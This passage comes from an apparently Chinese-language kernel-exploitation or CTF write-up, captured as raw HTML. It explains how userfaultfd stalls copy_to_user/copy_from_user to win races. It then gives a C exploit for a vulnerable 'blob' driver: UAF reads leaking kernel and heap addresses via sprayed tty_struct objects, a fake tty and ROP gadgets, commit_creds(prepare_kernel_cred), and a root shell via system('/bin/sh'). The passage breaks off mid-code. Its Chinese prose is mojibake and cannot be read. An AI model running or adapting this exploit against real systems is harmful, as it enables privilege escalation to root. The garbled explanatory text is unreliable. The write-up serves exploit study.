punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x0000: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x1000: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x0000: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x1000: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬å·²ç»ä½¿ç”¨mmapåœ¨ç”¨æˆ·ç©ºé—´åˆ†é…äº†ä¸¤ä¸ªåŒ¿åé¡µï¼Œå¹¶æ³¨å†Œäº†userfaultfdï¼Œå¯¹äºå‰ä¸¤ä¸ªstrcpyï¼Œç¬¬ä¸€æ¬¡è®¿é—®ä¼šå¯¼è‡´ç¼ºé¡µå¼‚å¸¸ï¼Œå› æ­¤ä¼šè§¦å‘userfaultfdå¤„ç†ç¨‹åºã€‚å¦‚ä¸‹å›¾ä¸­å‰ä¸¤æ¬¡éƒ½å‡ºç°äº†è¿”å›çš„uffd_msgä¿¡æ¯</p></li></ol><p><img src="/EXP_FILE/6704f61e3cc202dabb0710864b4658ce_MD5.jpeg"></p><hr><p>ä¸€äº›è¡¥å……çš„å†…å®¹ï¼š</p><p><code>poll()</code> çš„æœ¬è´¨ä¸ select() ç±»ä¼¼ï¼Œç”¨äºç›‘è§†å¹¶ç­‰å¾…å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦çš„å±æ€§å˜åŒ–ã€‚ä¸è¿‡ä¸ select() ä¸åŒï¼Œpoll() æ²¡æœ‰æœ€å¤§æ–‡ä»¶æè¿°ç¬¦æ•°é‡çš„é™åˆ¶ï¼Œä½†æ˜¯å½“æ–‡ä»¶æè¿°ç¬¦æ•°é‡è¿‡å¤§æ—¶ï¼Œæ€§èƒ½å¯èƒ½ä¼šä¸‹é™ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;poll.h></span> </span><span class="token keyword">int</span> <span class="token function">poll</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pollfd</span> <span class="token operator">*</span>fds<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> nfds<span class="token punctuation">,</span> <span class="token keyword">int</span> timeout<span class="token punctuation">)</span><span class="token operator">*</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><code>fds</code> : æŒ‡å‘pollfdç»“æ„ä½“æ•°ç»„ï¼Œç”¨äºå­˜æ”¾éœ€è¦æ£€æµ‹å™¨çŠ¶æ€çš„Socketæè¿°ç¬¦æˆ–å…¶å®ƒæ–‡ä»¶æè¿°ç¬¦ã€‚</li><li><code>nfds</code>ï¼šæŒ‡å®špollfd ç»“æ„ä½“æ•°ç»„çš„ä¸ªæ•°ï¼Œå³ç›‘æ§å‡ ä¸ªpollfd.</li><li><code>timeout</code>ï¼šæŒ‡poll()è°ƒç”¨é˜»å¡çš„æ—¶é—´ï¼Œå•ä½æ˜¯msã€‚<ul><li>-1 è¡¨ç¤ºä¸€ç›´é˜»å¡ï¼Œç›´åˆ°æœ‰äº‹ä»¶äº§ç”Ÿï¼›</li><li>0 è¡¨ç¤ºéé˜»å¡ï¼Œç«‹å³è¿”å›ï¼›</li><li>å¤§äº 0 è¡¨ç¤ºè®¾ç½®ä¸€ä¸ªè¶…æ—¶æ—¶é—´ã€‚</li></ul></li><li>è¿”å›å€¼<ul><li>æˆåŠŸæ—¶ï¼Œpoll() è¿”å›ç»“æ„ä½“ä¸­ revents åŸŸä¸ä¸º 0 çš„æ–‡ä»¶æè¿°ç¬¦ä¸ªæ•°ã€‚</li><li>å¦‚æœåœ¨è¶…æ—¶å‰æ²¡æœ‰ä»»ä½•äº‹ä»¶å‘ç”Ÿï¼Œpoll() è¿”å› 0ã€‚</li><li>å¤±è´¥æ—¶ï¼Œpoll() è¿”å› -1ï¼Œå¹¶è®¾ç½® errno ä¸ºç›¸åº”çš„é”™è¯¯ç ï¼ˆå¦‚ EBADFã€EFAULTã€EINTR ç­‰ï¼‰ã€‚</li></ul></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">pollfd</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> fd<span class="token punctuation">;</span>  <span class="token comment">//å§”æ‰˜å†…æ ¸æ£€æµ‹çš„æ–‡ä»¶æè¿°ç¬¦</span>    <span class="token keyword">short</span> events<span class="token punctuation">;</span><span class="token comment">//å§”æ‰˜å†…æ ¸æ£€æµ‹çš„fdäº‹ä»¶ï¼ˆè¾“å…¥ã€è¾“å‡ºã€é”™è¯¯ï¼‰ï¼Œæ¯ä¸€ä¸ªäº‹ä»¶æœ‰å¤šä¸ªå–å€¼</span>    <span class="token keyword">short</span> revents<span class="token punctuation">;</span><span class="token comment">//è¿™æ˜¯ä¸€ä¸ªä¼ å‡ºå‚æ•°ï¼Œæ•°æ®ç”±å†…æ ¸å†™å…¥ï¼Œå­˜å‚¨å†…æ ¸æ£€æµ‹ä¹‹åçš„ç»“æœ</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„äº‹ä»¶æ ‡è®°ï¼š</p><ul><li>POLLINï¼šè¡¨ç¤ºæ•°æ®å¯è¯»ã€‚</li><li>POLLPRIï¼šè¡¨ç¤ºç´§æ€¥æ•°æ®å¯è¯»ï¼ˆä¾‹å¦‚ TCP å¥—æ¥å­—çš„å¸¦å¤–æ•°æ®ï¼‰ã€‚</li><li>POLLOUTï¼šè¡¨ç¤ºæ•°æ®å¯å†™ã€‚</li><li>POLLERRï¼šè¡¨ç¤ºå‘ç”Ÿé”™è¯¯ï¼ˆåªåœ¨è¿”å›çš„äº‹ä»¶ä¸­ï¼‰ã€‚</li><li>POLLNVALï¼šè¡¨ç¤ºæ–‡ä»¶æè¿°ç¬¦æœªæ‰“å¼€ï¼ˆå·²å…³é—­ï¼‰ã€‚</li></ul><h3 id="åˆ©ç”¨userfaultfdè¿›è¡Œç«äº‰"><a href="#åˆ©ç”¨userfaultfdè¿›è¡Œç«äº‰" class="headerlink" title="åˆ©ç”¨userfaultfdè¿›è¡Œç«äº‰"></a>åˆ©ç”¨userfaultfdè¿›è¡Œç«äº‰</h3><p>ä¸ºä»€ä¹ˆuserfaultfdå¯ä»¥ç”¨äºæé«˜å†…æ ¸ç«æ€æ¡ä»¶æ¼æ´åˆ©ç”¨æˆåŠŸç‡å‘¢ï¼Ÿ</p><p>å…¶å®ï¼Œæˆ‘ä»¬ä¹‹å‰çš„å¤§éƒ¨åˆ†å†…æ ¸æ¼æ´åˆ©ç”¨è¿‡ç¨‹å¤§ä½“éƒ½å¯ä»¥æŠ½è±¡ä¸ºä¸€æ¬¡æˆ–å¤šæ¬¡çš„ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´çš„æ•°æ®äº¤æ¢ã€‚ä¾‹å¦‚ï¼š</p><ol><li>ç”¨æˆ·ç©ºé—´ä»å†…æ ¸ç©ºé—´ä¸­è·å–æ•°æ®ï¼Œä»è€Œè·å¾—å†…æ ¸ç¬¦å·åœ°å€ã€‚</li><li>ç”¨æˆ·ç©ºé—´å‘å†…æ ¸ç©ºé—´å†™æ•°æ®ï¼Œä»è€Œåœ¨å†…æ ¸ä¸­å¸ƒç½®ROPé“¾æˆ–å…¶ä»–è½½è·ã€‚</li><li>ç”¨æˆ·ç©ºé—´æ‰§è¡Œè§¦å‘æ¼æ´çš„ç³»ç»Ÿè°ƒç”¨ï¼ŒåŠ«æŒæ§åˆ¶æµã€‚</li></ol><p>å…¶ä¸­ï¼Œç¬¬1æ­¥å’Œç¬¬2æ­¥éƒ½éœ€è¦å¯¹ç”¨æˆ·ç©ºé—´çš„å†…å­˜è¿›è¡Œå†™æˆ–è¯»æ“ä½œã€‚é‚£ä¹ˆï¼Œå†…æ ¸å¯¹ç”¨æˆ·ç©ºé—´å†…å­˜é¡µçš„ç¬¬ä¸€æ¬¡è¯»æˆ–å†™æ“ä½œéƒ½å°†è§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œ<strong>åœ¨userfaultfdæœºåˆ¶ä¸‹ï¼Œæ§åˆ¶æµå°†å›åˆ°å¼‚å¸¸å¤„ç†çº¿ç¨‹ä¸Šï¼Œä¹Ÿå°±æ˜¯ä»å†…æ ¸ç©ºé—´å›åˆ°äº†ç”¨æˆ·ç©ºé—´</strong>ï¼è¿™æ ·ä¸€æ¥ï¼Œæ”»å‡»è€…å¾—ä»¥æœ‰æœºä¼šåœ¨çœŸæ­£çš„å¯¹ç”¨æˆ·ç©ºé—´å†…å­˜å†™ï¼ˆå¯¹åº”ç¬¬1æ­¥ï¼Œé€šå¸¸æ˜¯å†…æ ¸<code>copy_to_user</code>å‡½æ•°è¿‡ç¨‹ä¸­ï¼‰æˆ–è¯»ï¼ˆå¯¹åº”ç¬¬2æ­¥ï¼Œé€šå¸¸æ˜¯å†…æ ¸<code>copy_from_user</code>å‡½æ•°è¿‡ç¨‹ä¸­ï¼‰æ“ä½œå‘ç”Ÿå‰æ–½åŠ æ§åˆ¶ã€‚</p><blockquote><p>é™¤éæ‚¨çŸ¥é“ç¨‹åºé›†çº§åˆ«ä½•æ—¶å‘ç”Ÿé¡µé¢é”™è¯¯ï¼Œå¦åˆ™è°ƒè¯•ä¼¼ä¹å¾ˆå›°éš¾ã€‚</p></blockquote><h2 id="ä¸‰-EXP"><a href="#ä¸‰-EXP" class="headerlink" title="(ä¸‰)EXP"></a>(ä¸‰)EXP</h2><h3 id="UAF-read"><a href="#UAF-read" class="headerlink" title="UAF read"></a>UAF read</h3><p>æ”¾ä¸€å¼ brant-ruanå¤§ä½¬çš„æ€è·¯å›¾ï¼ˆUAF readï¼‰ï¼š<br><img src="/EXP_FILE/d8d9ea5bfb221feb4952695bffef14b3_MD5.jpeg"><br>ç®€å•æ¥è¯´ï¼Œä¸»çº¿ç¨‹é¦–å…ˆåœ¨ç”¨æˆ·ç©ºé—´æ˜ å°„ä¸€ä¸ªç©ºç™½åŒ¿åé¡µï¼Œç„¶åè§¦å‘<code>blob_get</code>ï¼Œè¯¥å‡½æ•°æœ«å°¾çš„<code>copy_to_user</code>å°†å¯¼è‡´ç¼ºé¡µå¼‚å¸¸ï¼Œæ§åˆ¶æµå›åˆ°å¼‚å¸¸å¤„ç†çº¿ç¨‹ï¼Œè¯¥çº¿ç¨‹åˆ¶é€ UAFå¹¶å †å–·<code>tty_struct</code>ï¼Œæœ€å<code>blob_get</code>æ¢å¤æ‰§è¡Œåå°†æŠŠ<code>tty_struct</code>å¯¹è±¡å†…å®¹å¤åˆ¶åˆ°ç©ºç™½åŒ¿åé¡µä¸­ï¼Œå®ç°åœ°å€æ³„éœ²ã€‚</p><p>âš éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>copy_to_user</code>å¹¶ä¸èƒ½æŠŠå®Œæ•´çš„ä¸€ä¸ª<code>tty_struct</code>å¯¹è±¡å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">/ # ./exp[*] Success to saveStatus![*] set cpu affinity[+] Dev Opened[*] set cpu affinity[*] fault_handler_thread: waiting for page fault...[+] uffd: flag=0x1[+] uffd: addr=0x7f9fc7dc700000: 0x000000000000000008: 0x000000000000000010: 0x000000000000000018: 0x000000000000000020: 0x000000000000000028: 0x000000000000000030: 0x000000000000000038: 0xffff888002f2f83840: 0xffff888002f2f83848: 0xffff888002f2f84850: 0xffff888002f2f84858: 0xffff888002de207060: 0x000000000000000068: 0x000000000000000070: 0xffff888002f2f87078: 0xffff888002f2f870[*] leak => 0x7e3c3c40[*] heap => 0xffff888002f2f838[x] Error: set<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯è§<code>tty_struct</code>å¼€å¤´çš„æ•°æ®æ²¡æœ‰è¢«å¤åˆ¶ï¼ˆæœ¬æ¥<code>tty_operation</code>æ˜¯æœ‰çš„ï¼Œä½†æ˜¯å‰0x30å­—èŠ‚å…¨æ˜¯0ï¼‰</p><p>âš è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå¦‚æœè¿½è¸ªè¯¥å‡½æ•°çš„æºç ï¼Œæˆ‘ä»¬æœ€ç»ˆå‘ç°<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/lib/copy_user_64.S#L125">åœ¨æ±‡ç¼–å±‚é¢</a>å®ƒæ˜¯ä¸æ–­å¾ªç¯è¿­ä»£å»å¤åˆ¶æ•°æ®çš„ã€‚åœ¨ç¬¬ä¸€æ¬¡è¿­ä»£å¤åˆ¶æ“ä½œæ—¶è§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œç„¶åæˆ‘ä»¬æ‰åˆ¶é€ UAFã€‚å› æ­¤ï¼Œç¬¬ä¸€æ¬¡å¤åˆ¶çš„æ•°æ®æ¥è‡ªUAFå‘ç”Ÿå‰çš„æ­£å¸¸çš„blobå¯¹è±¡ã€‚ä¸è¿‡ï¼Œå¤åˆ¶çš„æ€»å¤§å°å†³å®šäº†æ¯æ¬¡å¾ªç¯è¿­ä»£å¤åˆ¶çš„æ•°æ®é‡ï¼ˆå­˜å‚¨åœ¨å¯„å­˜å™¨ä¸­ï¼‰ã€‚å› æ­¤å¦‚æœä½¿ç”¨è¾ƒå°çš„å¤§å°ï¼ˆä¾‹å¦‚ 0x20ï¼‰è¿›è¡Œè°ƒç”¨ï¼Œåˆ™åªæœ‰å‰ 0x10 å­—èŠ‚å°†æ˜¯ UAF ä¹‹å‰çš„æ•°æ®ï¼Œå…¶ä½™0x10 å­—èŠ‚å°†åœ¨ UAF ä¹‹åå¤åˆ¶ã€‚åŒç†0x400ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</p><p>å› æ­¤æˆ‘ä»¬éœ€è¦ä¸¤æ¬¡UAFæ¥åˆ†åˆ«æ³„éœ²å†…æ ¸åŸºå€å’Œkheapåœ°å€ã€‚</p><h3 id="UAF-write"><a href="#UAF-write" class="headerlink" title="UAF write"></a>UAF write</h3><p>åˆ©ç”¨hander_threadï¼Œå°†fake_ttyæ‹·è´åˆ°faulting pageï¼Œè¿›è€Œå¤åˆ¶åˆ°å†…æ ¸å †ç©ºé—´ã€‚</p><p>(UAF write)<br><img src="/EXP_FILE/ce183b90d7139155d4df2382bfc3d808_MD5.jpeg"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä½œè€…åœ¨<code>blob_del</code>åˆ¶é€ UAFå‰è¿›è¡Œäº†ä¸€æ¬¡å †å–·ï¼Œå–·å°„äº†åŒ…å«ropchainçš„å¯¹è±¡ã€‚</p><p>è¿™æ˜¯å› ä¸ºä¹‹å‰æ³„éœ²çš„å †åœ°å€<code>kheap</code>é€šå¸¸å¹¶ä¸æ˜¯è¿™æ¬¡UAFç›¸å…³å¯¹è±¡çš„å †åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å†…æ ¸ç©ºé—´å–·å°„å¾ˆå¤šçš„fake_ttyï¼Œä¸”ops-&gt;ioctl &#x3D; kheapï¼›åªè¦æœ‰ä¸€å‘½ä¸­å°±èƒ½å¤Ÿè§¦å‘ stack pivot å¹¶æ‰§è¡Œæˆ‘ä»¬çš„ropchain</p><p>EXPå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/userfaultfd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;poll.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_ADD</span> <span class="token expression"><span class="token number">0xf1ec0001</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_DEL</span> <span class="token expression"><span class="token number">0xf1ec0002</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_GET</span> <span class="token expression"><span class="token number">0xf1ec0003</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_SET</span> <span class="token expression"><span class="token number">0xf1ec0004</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0xffffffff8109b0ed</span><span class="token operator">+</span>koff<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSD_RET</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0xffffffff81654bdb</span><span class="token operator">+</span>koff<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0xffffffff81022fe3</span><span class="token operator">+</span>koff<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PUSH_RDX_CMP_EAX_0x415b005c_POP_RSP_RBP_RET</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0xffffffff8109b13a</span><span class="token operator">+</span>koff<span class="token punctuation">)</span></span></span><span class="token class-name">size_t</span> prepare_kernel_cred<span class="token operator">=</span><span class="token number">0xffffffff810729d0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds<span class="token operator">=</span><span class="token number">0xffffffff81072830</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[x] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[x] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> id<span class="token punctuation">;</span>  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token class-name">request_t</span><span class="token punctuation">;</span><span class="token class-name">request_t</span> req<span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> victim<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> spray<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token keyword">int</span> core<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">cpu_set_t</span> cpu_set<span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] set cpu affinity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_SET</span><span class="token punctuation">(</span>core<span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">pthread_t</span> monitor_thread<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">registerUserFaultFd</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span> addr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> len<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>handler<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_api</span> uffdio_api<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_register</span> uffdio_register<span class="token punctuation">;</span>    <span class="token keyword">int</span> s<span class="token punctuation">;</span>    <span class="token comment">/* Create and enable userfaultfd object */</span>    uffd <span class="token operator">=</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_userfaultfd<span class="token punctuation">,</span> O_CLOEXEC <span class="token operator">|</span> O_NONBLOCK<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>uffd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"userfaultfd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uffdio_api<span class="token punctuation">.</span>api <span class="token operator">=</span> UFFD_API<span class="token punctuation">;</span>    uffdio_api<span class="token punctuation">.</span>features <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_API<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_api<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_API"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>start <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> addr<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>len <span class="token operator">=</span> len<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>mode <span class="token operator">=</span> 